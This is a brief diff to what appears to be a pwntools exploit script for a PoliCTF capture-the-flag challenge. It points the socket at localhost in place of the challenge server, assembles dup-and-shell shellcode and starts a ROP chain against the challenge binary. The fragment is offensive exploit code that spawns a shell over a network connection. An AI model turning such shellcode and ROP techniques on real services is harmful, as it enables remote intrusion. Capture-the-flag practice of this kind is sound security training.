@@ -3,9 +3,8 @@ from pwn import *
 context('i386', 'linux', 'ipv4')
 
 sock = remote('localhost', 32000, timeout = None)
-# sock = remote('pwn.challenges.polictf.it', 32000)
 
-shellcode = asm(dupsh(0))
+shellcode = asm(shellcodes.dupsh(0))
 
 rop = ROP('./chal')
 
